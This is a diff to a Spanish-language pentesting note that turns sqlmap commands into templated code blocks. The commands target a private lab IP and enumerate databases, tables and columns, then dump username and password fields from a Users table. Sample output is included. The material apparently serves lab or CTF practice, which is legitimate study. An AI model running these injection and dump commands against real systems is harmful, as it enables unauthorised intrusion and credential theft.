@@ -7,7 +7,6 @@ extraer las bases de datos
 ```sh fold:"SQLMap descubrir bases de datos"
 sqlmap -u http://192.168.1.141/administrator/ --forms --dbs --batch
 ```
-sqlmap -u http://192.168.1.141/administrator/ --forms --dbs --batch
 ejemplo de salida:
 [*] information_schema                                                                                                  
 [*] mysql
@@ -16,7 +15,10 @@ ejemplo de salida:
 
 
 ahora vamos a conocer las tablas de la base de datos Webapp
-sqlmap -u http://192.168.1.141/administrator/ --forms -D Webapp --tables --batch
+```sh fold:"SQLMap descubrir tablas de una BD"
+sqlmap -u http://192.168.1.141/administrator/ --forms -D {DB_Name} --tables --batch
+```
+
 
 Ejemplo de salida:
 Database: Webapp                                                                                                                                   
@@ -27,7 +29,10 @@ Database: Webapp
 
 
 Ahora vamos a  sacar las columnas de la tabla Users
-sqlmap -u http://192.168.1.141/administrator/ --forms -D Webapp -T Users --columns --batch
+```sh fold:"SQLMap descubrir columnas de una tabla"
+sqlmap -u http://192.168.1.141/administrator/ --forms -D {DB_Name} -T {Table_name} --columns --batch
+```
+
 Ejemplo de salida:
 [3 columns]
 +----------+-------------+
@@ -41,7 +46,11 @@ Ejemplo de salida:
 
 
 Ahora vamos a sacar los registros de las columnas
-sqlmap -u http://192.168.1.141/administrator/ --forms -D Webapp -T Users -C username,password --dump --batch
+
+```sh fold:"SQLMap descubrir registros de una tabla"
+sqlmap -u http://192.168.1.141/administrator/ --forms -D {DB_Name} -T {Table_name} -C {column1,column1,column3} --dump --batch
+```
+
 ejemplo de salida:
 Database: Webapp
 Table: Users
